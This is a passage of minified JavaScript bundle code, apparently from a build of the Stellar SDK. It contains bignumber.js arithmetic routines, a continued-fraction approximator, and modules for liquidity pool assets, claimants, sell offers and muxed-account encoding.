                        for (qe = 0,
                        vt = He[lt] % st,
                        we = He[lt] / st | 0,
                        je = Qe,
                        nt = lt + je; nt > lt; )
                            We = tt[--je] % st,
                            mt = tt[je] / st | 0,
                            Ke = we * We + mt * vt,
                            We = vt * We + Ke % st * st + _e[nt] + qe,
                            qe = (We / Ce | 0) + (Ke / st | 0) + we * mt,
                            _e[nt--] = We % Ce;
                        _e[nt] = qe
                    }
                    return qe ? ++Ve : _e.splice(0, 1),
                    Te($e, _e, Ve)
                }
                ,
                Be.negated = function() {
                    var $e = new Re(this);
                    return $e.s = -$e.s || null,
                    $e
                }
                ,
                Be.plus = function($e, Ne) {
                    var qe, Ve = this, lt = Ve.s;
                    if ($e = new Re($e,Ne),
                    Ne = $e.s,
                    !lt || !Ne)
                        return new Re(NaN);
                    if (lt != Ne)
                        return $e.s = -Ne,
                        Ve.minus($e);
                    var nt = Ve.e / F
                      , je = $e.e / F
                      , Ke = Ve.c
                      , Qe = $e.c;
                    if (!nt || !je) {
                        if (!Ke || !Qe)
                            return new Re(lt / 0);
                        if (!Ke[0] || !Qe[0])
                            return Qe[0] ? $e : new Re(Ke[0] ? Ve : lt * 0)
                    }
                    if (nt = ne(nt),
                    je = ne(je),
                    Ke = Ke.slice(),
                    lt = nt - je) {
                        for (lt > 0 ? (je = nt,
                        qe = Qe) : (lt = -lt,
                        qe = Ke),
                        qe.reverse(); lt--; qe.push(0))
                            ;
                        qe.reverse()
                    }
                    for (lt = Ke.length,
                    Ne = Qe.length,
                    lt - Ne < 0 && (qe = Qe,
                    Qe = Ke,
                    Ke = qe,
                    Ne = lt),
                    lt = 0; Ne; )
                        lt = (Ke[--Ne] = Ke[Ne] + Qe[Ne] + lt) / Y | 0,
                        Ke[Ne] = Y === Ke[Ne] ? 0 : Ke[Ne] % Y;
                    return lt && (Ke = [lt].concat(Ke),
                    ++je),
                    Te($e, Ke, je)
                }
                ,
                Be.precision = Be.sd = function($e, Ne) {
                    var qe, Ve, lt, nt = this;
                    if ($e != null && $e !== !!$e)
                        return fe($e, 1, ee),
                        Ne == null ? Ne = L : fe(Ne, 0, 8),
                        Le(new Re(nt), $e, Ne);
                    if (!(qe = nt.c))
                        return null;
                    if (lt = qe.length - 1,
                    Ve = lt * F + 1,
                    lt = qe[lt]) {
                        for (; lt % 10 == 0; lt /= 10,
                        Ve--)
                            ;
                        for (lt = qe[0]; lt >= 10; lt /= 10,
                        Ve++)
                            ;
                    }
                    return $e && nt.e + 1 > Ve && (Ve = nt.e + 1),
                    Ve
                }
                ,
                Be.shiftedBy = function($e) {
                    return fe($e, -9007199254740991, V),
                    this.times("1e" + $e)
                }
                ,
                Be.squareRoot = Be.sqrt = function() {
                    var $e, Ne, qe, Ve, lt, nt = this, je = nt.c, Ke = nt.s, Qe = nt.e, We = q + 4, mt = new Re("0.5");
                    if (Ke !== 1 || !je || !je[0])
                        return new Re(!Ke || Ke < 0 && (!je || je[0]) ? NaN : je ? nt : 1 / 0);
                    if (Ke = Math.sqrt(+Ze(nt)),
                    Ke == 0 || Ke == 1 / 0 ? (Ne = oe(je),
                    (Ne.length + Qe) % 2 == 0 && (Ne += "0"),
                    Ke = Math.sqrt(+Ne),
                    Qe = ne((Qe + 1) / 2) - (Qe < 0 || Qe % 2),
                    Ke == 1 / 0 ? Ne = "5e" + Qe : (Ne = Ke.toExponential(),
                    Ne = Ne.slice(0, Ne.indexOf("e") + 1) + Qe),
                    qe = new Re(Ne)) : qe = new Re(Ke + ""),
                    qe.c[0]) {
                        for (Qe = qe.e,
                        Ke = Qe + We,
                        Ke < 3 && (Ke = 0); ; )
                            if (lt = qe,
                            qe = mt.times(lt.plus(xe(nt, lt, We, 1))),
                            oe(lt.c).slice(0, Ke) === (Ne = oe(qe.c)).slice(0, Ke))
                                if (qe.e < Qe && --Ke,
                                Ne = Ne.slice(Ke - 3, Ke + 1),
                                Ne == "9999" || !Ve && Ne == "4999") {
                                    if (!Ve && (Le(lt, lt.e + q + 2, 0),
                                    lt.times(lt).eq(nt))) {
                                        qe = lt;
                                        break
                                    }
                                    We += 4,
                                    Ke += 4,
                                    Ve = 1
                                } else {
                                    (!+Ne || !+Ne.slice(1) && Ne.charAt(0) == "5") && (Le(qe, qe.e + q + 2, 1),
                                    $e = !qe.times(qe).eq(nt));
                                    break
                                }
                    }
                    return Le(qe, qe.e + q + 1, L, $e)
                }
                ,
                Be.toExponential = function($e, Ne) {
                    return $e != null && (fe($e, 0, ee),
                    $e++),
                    Pe(this, $e, Ne, 1)
                }
                ,
                Be.toFixed = function($e, Ne) {
                    return $e != null && (fe($e, 0, ee),
                    $e = $e + this.e + 1),
                    Pe(this, $e, Ne)
                }
                ,
                Be.toFormat = function($e, Ne, qe) {
                    var Ve, lt = this;
                    if (qe == null)
                        $e != null && Ne && typeof Ne == "object" ? (qe = Ne,
                        Ne = null) : $e && typeof $e == "object" ? (qe = $e,
                        $e = Ne = null) : qe = ie;
                    else if (typeof qe != "object")
                        throw Error(b + "Argument not an object: " + qe);
                    if (Ve = lt.toFixed($e, Ne),
                    lt.c) {
                        var nt, je = Ve.split("."), Ke = +qe.groupSize, Qe = +qe.secondaryGroupSize, We = qe.groupSeparator || "", mt = je[0], ct = je[1], vt = lt.s < 0, we = vt ? mt.slice(1) : mt, _e = we.length;
                        if (Qe && (nt = Ke,
                        Ke = Qe,
                        Qe = nt,
                        _e -= nt),
                        Ke > 0 && _e > 0) {
                            for (nt = _e % Ke || Ke,
                            mt = we.substr(0, nt); nt < _e; nt += Ke)
                                mt += We + we.substr(nt, Ke);
                            Qe > 0 && (mt += We + we.slice(nt)),
                            vt && (mt = "-" + mt)
                        }
                        Ve = ct ? mt + (qe.decimalSeparator || "") + ((Qe = +qe.fractionGroupSize) ? ct.replace(new RegExp("\\d{" + Qe + "}\\B","g"), "$&" + (qe.fractionGroupSeparator || "")) : ct) : mt
                    }
                    return (qe.prefix || "") + Ve + (qe.suffix || "")
                }
                ,
                Be.toFraction = function($e) {
                    var Ne, qe, Ve, lt, nt, je, Ke, Qe, We, mt, ct, vt, we = this, _e = we.c;
                    if ($e != null && (Ke = new Re($e),
                    !Ke.isInteger() && (Ke.c || Ke.s !== 1) || Ke.lt(ce)))
                        throw Error(b + "Argument " + (Ke.isInteger() ? "out of range: " : "not an integer: ") + Ze(Ke));
                    if (!_e)
                        return new Re(we);
                    for (Ne = new Re(ce),
                    We = qe = new Re(ce),
                    Ve = Qe = new Re(ce),
                    vt = oe(_e),
                    nt = Ne.e = vt.length - we.e - 1,
                    Ne.c[0] = K[(je = nt % F) < 0 ? F + je : je],
                    $e = !$e || Ke.comparedTo(Ne) > 0 ? nt > 0 ? Ne : We : Ke,
                    je = se,
                    se = 1 / 0,
                    Ke = new Re(vt),
                    Qe.c[0] = 0; mt = xe(Ke, Ne, 0, 1),
                    lt = qe.plus(mt.times(Ve)),
                    lt.comparedTo($e) != 1; )
                        qe = Ve,
                        Ve = lt,
                        We = Qe.plus(mt.times(lt = We)),
                        Qe = lt,
                        Ne = Ke.minus(mt.times(lt = Ne)),
                        Ke = lt;
                    return lt = xe($e.minus(qe), Ve, 0, 1),
                    Qe = Qe.plus(lt.times(We)),
                    qe = qe.plus(lt.times(Ve)),
                    Qe.s = We.s = we.s,
                    nt = nt * 2,
                    ct = xe(We, Ve, nt, L).minus(we).abs().comparedTo(xe(Qe, qe, nt, L).minus(we).abs()) < 1 ? [We, Ve] : [Qe, qe],
                    se = je,
                    ct
                }
                ,
                Be.toNumber = function() {
                    return +Ze(this)
                }
                ,
                Be.toPrecision = function($e, Ne) {
                    return $e != null && fe($e, 1, ee),
                    Pe(this, $e, Ne, 2)
                }
                ,
                Be.toString = function($e) {
                    var Ne, qe = this, Ve = qe.s, lt = qe.e;
                    return lt === null ? Ve ? (Ne = "Infinity",
                    Ve < 0 && (Ne = "-" + Ne)) : Ne = "NaN" : ($e == null ? Ne = lt <= U || lt >= Z ? pe(oe(qe.c), lt) : ye(oe(qe.c), lt, "0") : $e === 10 && ge ? (qe = Le(new Re(qe), q + lt + 1, L),
                    Ne = ye(oe(qe.c), qe.e, "0")) : (fe($e, 2, ve.length, "Base"),
                    Ne = Ae(ye(oe(qe.c), lt, "0"), 10, $e, Ve, !0)),
                    Ve < 0 && qe.c[0] && (Ne = "-" + Ne)),
                    Ne
                }
                ,
                Be.valueOf = Be.toJSON = function() {
                    return Ze(this)
                }
                ,
                Be._isBigNumber = !0,
                be != null && Re.set(be),
                Re
            }
            function ne(be) {
                var xe = be | 0;
                return be > 0 || be === xe ? xe : xe - 1
            }
            function oe(be) {
                for (var xe, Ae, Ee = 1, Be = be.length, ce = be[0] + ""; Ee < Be; ) {
                    for (xe = be[Ee++] + "",
                    Ae = F - xe.length; Ae--; xe = "0" + xe)
                        ;
                    ce += xe
                }
                for (Be = ce.length; ce.charCodeAt(--Be) === 48; )
                    ;
                return ce.slice(0, Be + 1 || 1)
            }
            function ue(be, xe) {
                var Ae, Ee, Be = be.c, ce = xe.c, q = be.s, L = xe.s, U = be.e, Z = xe.e;
                if (!q || !L)
                    return null;
                if (Ae = Be && !Be[0],
                Ee = ce && !ce[0],
                Ae || Ee)
                    return Ae ? Ee ? 0 : -L : q;
                if (q != L)
                    return q;
                if (Ae = q < 0,
                Ee = U == Z,
                !Be || !ce)
                    return Ee ? 0 : !Be ^ Ae ? 1 : -1;
                if (!Ee)
                    return U > Z ^ Ae ? 1 : -1;
                for (L = (U = Be.length) < (Z = ce.length) ? U : Z,
                q = 0; q < L; q++)
                    if (Be[q] != ce[q])
                        return Be[q] > ce[q] ^ Ae ? 1 : -1;
                return U == Z ? 0 : U > Z ^ Ae ? 1 : -1
            }
            function fe(be, xe, Ae, Ee) {
                if (be < xe || be > Ae || be !== w(be))
                    throw Error(b + (Ee || "Argument") + (typeof be == "number" ? be < xe || be > Ae ? " out of range: " : " not an integer: " : " not a primitive number: ") + String(be))
            }
            function he(be) {
                var xe = be.c.length - 1;
                return ne(be.e / F) == xe && be.c[xe] % 2 != 0
            }
            function pe(be, xe) {
                return (be.length > 1 ? be.charAt(0) + "." + be.slice(1) : be) + (xe < 0 ? "e" : "e+") + xe
            }
            function ye(be, xe, Ae) {
                var Ee, Be;
                if (xe < 0) {
                    for (Be = Ae + "."; ++xe; Be += Ae)
                        ;
                    be = Be + be
                } else if (Ee = be.length,
                ++xe > Ee) {
                    for (Be = Ae,
                    xe -= Ee; --xe; Be += Ae)
                        ;
                    be += Be
                } else
                    xe < Ee && (be = be.slice(0, xe) + "." + be.slice(xe));
                return be
            }
            j = ae(),
            j.default = j.BigNumber = j,
            _.exports ? _.exports = j : (M || (M = typeof self < "u" && self ? self : window),
            M.BigNumber = j)
        }
        )(bignumber)
    }(bignumber$1)),
    bignumber$1.exports
}
var hasRequiredBignumber;
function requireBignumber() {
    return hasRequiredBignumber || (hasRequiredBignumber = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.default = void 0;
        var M = j(requireBignumber$1());
        function j(x) {
            return x && x.__esModule ? x : {
                default: x
            }
        }
        var O = M.default.clone();
        O.DEBUG = !0,
        _.default = O
    }(bignumber$2)),
    bignumber$2
}
var continued_fraction = {}, hasRequiredContinued_fraction;
function requireContinued_fraction() {
    if (hasRequiredContinued_fraction)
        return continued_fraction;
    hasRequiredContinued_fraction = 1,
    Object.defineProperty(continued_fraction, "__esModule", {
        value: !0
    }),
    continued_fraction.best_r = F;
    var _ = M(requireBignumber());
    function M(V) {
        return V && V.__esModule ? V : {
            default: V
        }
    }
    function j(V, K) {
        return X(V) || b(V, K) || x(V, K) || O()
    }
    function O() {
        throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
    }
    function x(V, K) {
        if (V) {
            if (typeof V == "string")
                return w(V, K);
            var Q = {}.toString.call(V).slice(8, -1);
            return Q === "Object" && V.constructor && (Q = V.constructor.name),
            Q === "Map" || Q === "Set" ? Array.from(V) : Q === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(Q) ? w(V, K) : void 0
        }
    }
    function w(V, K) {
        (K == null || K > V.length) && (K = V.length);
        for (var Q = 0, ee = Array(K); Q < K; Q++)
            ee[Q] = V[Q];
        return ee
    }
    function b(V, K) {
        var Q = V == null ? null : typeof Symbol < "u" && V[Symbol.iterator] || V["@@iterator"];
        if (Q != null) {
            var ee, ae, ne, oe, ue = [], fe = !0, he = !1;
            try {
                if (ne = (Q = Q.call(V)).next,
                K !== 0)
                    for (; !(fe = (ee = ne.call(Q)).done) && (ue.push(ee.value),
                    ue.length !== K); fe = !0)
                        ;
            } catch (pe) {
                he = !0,
                ae = pe
            } finally {
                try {
                    if (!fe && Q.return != null && (oe = Q.return(),
                    Object(oe) !== oe))
                        return
                } finally {
                    if (he)
                        throw ae
                }
            }
            return ue
        }
    }
    function X(V) {
        if (Array.isArray(V))
            return V
    }
    var Y = (1 << 31 >>> 0) - 1;
    function F(V) {
        for (var K = new _.default(V), Q, ee, ae = [[new _.default(0), new _.default(1)], [new _.default(1), new _.default(0)]], ne = 2; !K.gt(Y); ) {
            Q = K.integerValue(_.default.ROUND_FLOOR),
            ee = K.minus(Q);
            var oe = Q.times(ae[ne - 1][0]).plus(ae[ne - 2][0])
              , ue = Q.times(ae[ne - 1][1]).plus(ae[ne - 2][1]);
            if (oe.gt(Y) || ue.gt(Y) || (ae.push([oe, ue]),
            ee.eq(0)))
                break;
            K = new _.default(1).div(ee),
            ne += 1
        }
        var fe = j(ae[ae.length - 1], 2)
          , he = fe[0]
          , pe = fe[1];
        if (he.isZero() || pe.isZero())
            throw new Error("Couldn't find approximation");
        return [he.toNumber(), pe.toNumber()]
    }
    return continued_fraction
}
var liquidity_pool_asset = {}, hasRequiredLiquidity_pool_asset;
function requireLiquidity_pool_asset() {
    if (hasRequiredLiquidity_pool_asset)
        return liquidity_pool_asset;
    hasRequiredLiquidity_pool_asset = 1,
    Object.defineProperty(liquidity_pool_asset, "__esModule", {
        value: !0
    }),
    liquidity_pool_asset.LiquidityPoolAsset = void 0;
    var _ = O(requireXdr())
      , M = requireAsset()
      , j = requireGet_liquidity_pool_id();
    function O(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function x(ee) {
        "@babel/helpers - typeof";
        return x = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ae) {
            return typeof ae
        }
        : function(ae) {
            return ae && typeof Symbol == "function" && ae.constructor === Symbol && ae !== Symbol.prototype ? "symbol" : typeof ae
        }
        ,
        x(ee)
    }
    function w(ee, ae) {
        var ne = Object.keys(ee);
        if (Object.getOwnPropertySymbols) {
            var oe = Object.getOwnPropertySymbols(ee);
            ae && (oe = oe.filter(function(ue) {
                return Object.getOwnPropertyDescriptor(ee, ue).enumerable
            })),
            ne.push.apply(ne, oe)
        }
        return ne
    }
    function b(ee) {
        for (var ae = 1; ae < arguments.length; ae++) {
            var ne = arguments[ae] != null ? arguments[ae] : {};
            ae % 2 ? w(Object(ne), !0).forEach(function(oe) {
                X(ee, oe, ne[oe])
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(ee, Object.getOwnPropertyDescriptors(ne)) : w(Object(ne)).forEach(function(oe) {
                Object.defineProperty(ee, oe, Object.getOwnPropertyDescriptor(ne, oe))
            })
        }
        return ee
    }
    function X(ee, ae, ne) {
        return (ae = K(ae))in ee ? Object.defineProperty(ee, ae, {
            value: ne,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : ee[ae] = ne,
        ee
    }
    function Y(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    function F(ee, ae) {
        for (var ne = 0; ne < ae.length; ne++) {
            var oe = ae[ne];
            oe.enumerable = oe.enumerable || !1,
            oe.configurable = !0,
            "value"in oe && (oe.writable = !0),
            Object.defineProperty(ee, K(oe.key), oe)
        }
    }
    function V(ee, ae, ne) {
        return ae && F(ee.prototype, ae),
        ne && F(ee, ne),
        Object.defineProperty(ee, "prototype", {
            writable: !1
        }),
        ee
    }
    function K(ee) {
        var ae = Q(ee, "string");
        return x(ae) == "symbol" ? ae : ae + ""
    }
    function Q(ee, ae) {
        if (x(ee) != "object" || !ee)
            return ee;
        var ne = ee[Symbol.toPrimitive];
        if (ne !== void 0) {
            var oe = ne.call(ee, ae);
            if (x(oe) != "object")
                return oe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ee)
    }
    return liquidity_pool_asset.LiquidityPoolAsset = function() {
        function ee(ae, ne, oe) {
            if (Y(this, ee),
            !ae || !(ae instanceof M.Asset))
                throw new Error("assetA is invalid");
            if (!ne || !(ne instanceof M.Asset))
                throw new Error("assetB is invalid");
            if (M.Asset.compare(ae, ne) !== -1)
                throw new Error("Assets are not in lexicographic order");
            if (!oe || oe !== j.LiquidityPoolFeeV18)
                throw new Error("fee is invalid");
            this.assetA = ae,
            this.assetB = ne,
            this.fee = oe
        }
        return V(ee, [{
            key: "toXDRObject",
            value: function() {
                var ne = new _.default.LiquidityPoolConstantProductParameters({
                    assetA: this.assetA.toXDRObject(),
                    assetB: this.assetB.toXDRObject(),
                    fee: this.fee
                })
                  , oe = new _.default.LiquidityPoolParameters("liquidityPoolConstantProduct",ne);
                return new _.default.ChangeTrustAsset("assetTypePoolShare",oe)
            }
        }, {
            key: "getLiquidityPoolParameters",
            value: function() {
                return b(b({}, this), {}, {
                    assetA: this.assetA,
                    assetB: this.assetB,
                    fee: this.fee
                })
            }
        }, {
            key: "getAssetType",
            value: function() {
                return "liquidity_pool_shares"
            }
        }, {
            key: "equals",
            value: function(ne) {
                return this.assetA.equals(ne.assetA) && this.assetB.equals(ne.assetB) && this.fee === ne.fee
            }
        }, {
            key: "toString",
            value: function() {
                var ne = (0,
                j.getLiquidityPoolId)("constant_product", this.getLiquidityPoolParameters()).toString("hex");
                return "liquidity_pool:".concat(ne)
            }
        }], [{
            key: "fromOperation",
            value: function(ne) {
                var oe = ne.switch();
                if (oe === _.default.AssetType.assetTypePoolShare()) {
                    var ue = ne.liquidityPool().constantProduct();
                    return new this(M.Asset.fromOperation(ue.assetA()),M.Asset.fromOperation(ue.assetB()),ue.fee())
                }
                throw new Error("Invalid asset type: ".concat(oe.name))
            }
        }])
    }(),
    liquidity_pool_asset
}
var claimant = {}, hasRequiredClaimant;
function requireClaimant() {
    if (hasRequiredClaimant)
        return claimant;
    hasRequiredClaimant = 1,
    Object.defineProperty(claimant, "__esModule", {
        value: !0
    }),
    claimant.Claimant = void 0;
    var _ = O(requireXdr())
      , M = requireKeypair()
      , j = requireStrkey();
    function O(V) {
        return V && V.__esModule ? V : {
            default: V
        }
    }
    function x(V) {
        "@babel/helpers - typeof";
        return x = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(K) {
            return typeof K
        }
        : function(K) {
            return K && typeof Symbol == "function" && K.constructor === Symbol && K !== Symbol.prototype ? "symbol" : typeof K
        }
        ,
        x(V)
    }
    function w(V, K) {
        if (!(V instanceof K))
            throw new TypeError("Cannot call a class as a function")
    }
    function b(V, K) {
        for (var Q = 0; Q < K.length; Q++) {
            var ee = K[Q];
            ee.enumerable = ee.enumerable || !1,
            ee.configurable = !0,
            "value"in ee && (ee.writable = !0),
            Object.defineProperty(V, Y(ee.key), ee)
        }
    }
    function X(V, K, Q) {
        return K && b(V.prototype, K),
        Q && b(V, Q),
        Object.defineProperty(V, "prototype", {
            writable: !1
        }),
        V
    }
    function Y(V) {
        var K = F(V, "string");
        return x(K) == "symbol" ? K : K + ""
    }
    function F(V, K) {
        if (x(V) != "object" || !V)
            return V;
        var Q = V[Symbol.toPrimitive];
        if (Q !== void 0) {
            var ee = Q.call(V, K);
            if (x(ee) != "object")
                return ee;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(V)
    }
    return claimant.Claimant = function() {
        function V(K, Q) {
            if (w(this, V),
            K && !j.StrKey.isValidEd25519PublicKey(K))
                throw new Error("Destination is invalid");
            if (this._destination = K,
            !Q)
                this._predicate = _.default.ClaimPredicate.claimPredicateUnconditional();
            else if (Q instanceof _.default.ClaimPredicate)
                this._predicate = Q;
            else
                throw new Error("Predicate should be an xdr.ClaimPredicate")
        }
        return X(V, [{
            key: "toXDRObject",
            value: function() {
                var Q = new _.default.ClaimantV0({
                    destination: M.Keypair.fromPublicKey(this._destination).xdrAccountId(),
                    predicate: this._predicate
                });
                return _.default.Claimant.claimantTypeV0(Q)
            }
        }, {
            key: "destination",
            get: function() {
                return this._destination
            },
            set: function(Q) {
                throw new Error("Claimant is immutable")
            }
        }, {
            key: "predicate",
            get: function() {
                return this._predicate
            },
            set: function(Q) {
                throw new Error("Claimant is immutable")
            }
        }], [{
            key: "predicateUnconditional",
            value: function() {
                return _.default.ClaimPredicate.claimPredicateUnconditional()
            }
        }, {
            key: "predicateAnd",
            value: function(Q, ee) {
                if (!(Q instanceof _.default.ClaimPredicate))
                    throw new Error("left Predicate should be an xdr.ClaimPredicate");
                if (!(ee instanceof _.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return _.default.ClaimPredicate.claimPredicateAnd([Q, ee])
            }
        }, {
            key: "predicateOr",
            value: function(Q, ee) {
                if (!(Q instanceof _.default.ClaimPredicate))
                    throw new Error("left Predicate should be an xdr.ClaimPredicate");
                if (!(ee instanceof _.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return _.default.ClaimPredicate.claimPredicateOr([Q, ee])
            }
        }, {
            key: "predicateNot",
            value: function(Q) {
                if (!(Q instanceof _.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return _.default.ClaimPredicate.claimPredicateNot(Q)
            }
        }, {
            key: "predicateBeforeAbsoluteTime",
            value: function(Q) {
                return _.default.ClaimPredicate.claimPredicateBeforeAbsoluteTime(_.default.Int64.fromString(Q))
            }
        }, {
            key: "predicateBeforeRelativeTime",
            value: function(Q) {
                return _.default.ClaimPredicate.claimPredicateBeforeRelativeTime(_.default.Int64.fromString(Q))
            }
        }, {
            key: "fromXDR",
            value: function(Q) {
                var ee;
                switch (Q.switch()) {
                case _.default.ClaimantType.claimantTypeV0():
                    return ee = Q.v0(),
                    new this(j.StrKey.encodeEd25519PublicKey(ee.destination().ed25519()),ee.predicate());
                default:
                    throw new Error("Invalid claimant type: ".concat(Q.switch().name))
                }
            }
        }])
    }(),
    claimant
}
var liquidity_pool_id = {}, hasRequiredLiquidity_pool_id;
function requireLiquidity_pool_id() {
    if (hasRequiredLiquidity_pool_id)
        return liquidity_pool_id;
    hasRequiredLiquidity_pool_id = 1,
    Object.defineProperty(liquidity_pool_id, "__esModule", {
        value: !0
    }),
    liquidity_pool_id.LiquidityPoolId = void 0;
    var _ = M(requireXdr());
    function M(Y) {
        return Y && Y.__esModule ? Y : {
            default: Y
        }
    }
    function j(Y) {
        "@babel/helpers - typeof";
        return j = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(F) {
            return typeof F
        }
        : function(F) {
            return F && typeof Symbol == "function" && F.constructor === Symbol && F !== Symbol.prototype ? "symbol" : typeof F
        }
        ,
        j(Y)
    }
    function O(Y, F) {
        if (!(Y instanceof F))
            throw new TypeError("Cannot call a class as a function")
    }
    function x(Y, F) {
        for (var V = 0; V < F.length; V++) {
            var K = F[V];
            K.enumerable = K.enumerable || !1,
            K.configurable = !0,
            "value"in K && (K.writable = !0),
            Object.defineProperty(Y, b(K.key), K)
        }
    }
    function w(Y, F, V) {
        return F && x(Y.prototype, F),
        V && x(Y, V),
        Object.defineProperty(Y, "prototype", {
            writable: !1
        }),
        Y
    }
    function b(Y) {
        var F = X(Y, "string");
        return j(F) == "symbol" ? F : F + ""
    }
    function X(Y, F) {
        if (j(Y) != "object" || !Y)
            return Y;
        var V = Y[Symbol.toPrimitive];
        if (V !== void 0) {
            var K = V.call(Y, F);
            if (j(K) != "object")
                return K;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(Y)
    }
    return liquidity_pool_id.LiquidityPoolId = function() {
        function Y(F) {
            if (O(this, Y),
            !F)
                throw new Error("liquidityPoolId cannot be empty");
            if (!/^[a-f0-9]{64}$/.test(F))
                throw new Error("Liquidity pool ID is not a valid hash");
            this.liquidityPoolId = F
        }
        return w(Y, [{
            key: "toXDRObject",
            value: function() {
                var V = _.default.PoolId.fromXDR(this.liquidityPoolId, "hex");
                return new _.default.TrustLineAsset("assetTypePoolShare",V)
            }
        }, {
            key: "getLiquidityPoolId",
            value: function() {
                return String(this.liquidityPoolId)
            }
        }, {
            key: "getAssetType",
            value: function() {
                return "liquidity_pool_shares"
            }
        }, {
            key: "equals",
            value: function(V) {
                return this.liquidityPoolId === V.getLiquidityPoolId()
            }
        }, {
            key: "toString",
            value: function() {
                return "liquidity_pool:".concat(this.liquidityPoolId)
            }
        }], [{
            key: "fromOperation",
            value: function(V) {
                var K = V.switch();
                if (K === _.default.AssetType.assetTypePoolShare()) {
                    var Q = V.liquidityPoolId().toString("hex");
                    return new this(Q)
                }
                throw new Error("Invalid asset type: ".concat(K.name))
            }
        }])
    }(),
    liquidity_pool_id
}
var operations = {}, manage_sell_offer = {}, hasRequiredManage_sell_offer;
function requireManage_sell_offer() {
    if (hasRequiredManage_sell_offer)
        return manage_sell_offer;
    hasRequiredManage_sell_offer = 1,
    Object.defineProperty(manage_sell_offer, "__esModule", {
        value: !0
    }),
    manage_sell_offer.manageSellOffer = O;
    var _ = requireXdr$1()
      , M = j(requireXdr());
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        var w = {};
        if (w.selling = x.selling.toXDRObject(),
        w.buying = x.buying.toXDRObject(),
        !this.isValidAmount(x.amount, !0))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (w.amount = this._toXDRAmount(x.amount),
        x.price === void 0)
            throw new TypeError("price argument is required");
        w.price = this._toXDRPrice(x.price),
        x.offerId !== void 0 ? x.offerId = x.offerId.toString() : x.offerId = "0",
        w.offerId = _.Hyper.fromString(x.offerId);
        var b = new M.default.ManageSellOfferOp(w)
          , X = {};
        return X.body = M.default.OperationBody.manageSellOffer(b),
        this.setSourceAccount(X, x),
        new M.default.Operation(X)
    }
    return manage_sell_offer
}
var create_passive_sell_offer = {}, hasRequiredCreate_passive_sell_offer;
function requireCreate_passive_sell_offer() {
    if (hasRequiredCreate_passive_sell_offer)
        return create_passive_sell_offer;
    hasRequiredCreate_passive_sell_offer = 1,
    Object.defineProperty(create_passive_sell_offer, "__esModule", {
        value: !0
    }),
    create_passive_sell_offer.createPassiveSellOffer = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j(O) {
        var x = {};
        if (x.selling = O.selling.toXDRObject(),
        x.buying = O.buying.toXDRObject(),
        !this.isValidAmount(O.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (x.amount = this._toXDRAmount(O.amount),
        O.price === void 0)
            throw new TypeError("price argument is required");
        x.price = this._toXDRPrice(O.price);
        var w = new _.default.CreatePassiveSellOfferOp(x)
          , b = {};
        return b.body = _.default.OperationBody.createPassiveSellOffer(w),
        this.setSourceAccount(b, O),
        new _.default.Operation(b)
    }
    return create_passive_sell_offer
}
var account_merge = {}, decode_encode_muxed_account = {}, hasRequiredDecode_encode_muxed_account;
function requireDecode_encode_muxed_account() {
    if (hasRequiredDecode_encode_muxed_account)
        return decode_encode_muxed_account;
    hasRequiredDecode_encode_muxed_account = 1,
    Object.defineProperty(decode_encode_muxed_account, "__esModule", {
        value: !0
    }),
    decode_encode_muxed_account.decodeAddressToMuxedAccount = O,
    decode_encode_muxed_account.encodeMuxedAccount = w,
    decode_encode_muxed_account.encodeMuxedAccountToAddress = x,
    decode_encode_muxed_account.extractBaseAddress = b;
    var _ = j(requireXdr())
      , M = requireStrkey();
    function j(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function O(F) {
        return M.StrKey.isValidMed25519PublicKey(F) ? X(F) : _.default.MuxedAccount.keyTypeEd25519(M.StrKey.decodeEd25519PublicKey(F))
    }
    function x(F) {
        return F.switch().value === _.default.CryptoKeyType.keyTypeMuxedEd25519().value ? Y(F) : M.StrKey.encodeEd25519PublicKey(F.ed25519())
    }
    function w(F, V) {
        if (!M.StrKey.isValidEd25519PublicKey(F))
            throw new Error("address should be a Stellar account ID (G...)");
        if (typeof V != "string")
            throw new Error("id should be a string representing a number (uint64)");
        return _.default.MuxedAccount.keyTypeMuxedEd25519(new _.default.MuxedAccountMed25519({
            id: _.default.Uint64.fromString(V),
            ed25519: M.StrKey.decodeEd25519PublicKey(F)
        }))
    }
    function b(F) {
        if (M.StrKey.isValidEd25519PublicKey(F))
            return F;
        if (!M.StrKey.isValidMed25519PublicKey(F))
            throw new TypeError("expected muxed account (M...), got ".concat(F));
        var V = O(F);
        return M.StrKey.encodeEd25519PublicKey(V.med25519().ed25519())
    }
    function X(F) {
        var V = M.StrKey.decodeMed25519PublicKey(F);
        return _.default.MuxedAccount.keyTypeMuxedEd25519(new _.default.MuxedAccountMed25519({
            id: _.default.Uint64.fromXDR(V.subarray(-8)),
            ed25519: V.subarray(0, -8)
        }))
    }
    function Y(F) {
        if (F.switch() === _.default.CryptoKeyType.keyTypeEd25519())
            return x(F);
        var V = F.med25519();
        return M.StrKey.encodeMed25519PublicKey(Buffer.concat([V.ed25519(), V.id().toXDR("raw")]))
    }
    return decode_encode_muxed_account
}
var hasRequiredAccount_merge;
function requireAccount_merge() {
    if (hasRequiredAccount_merge)
        return account_merge;
    hasRequiredAccount_merge = 1,
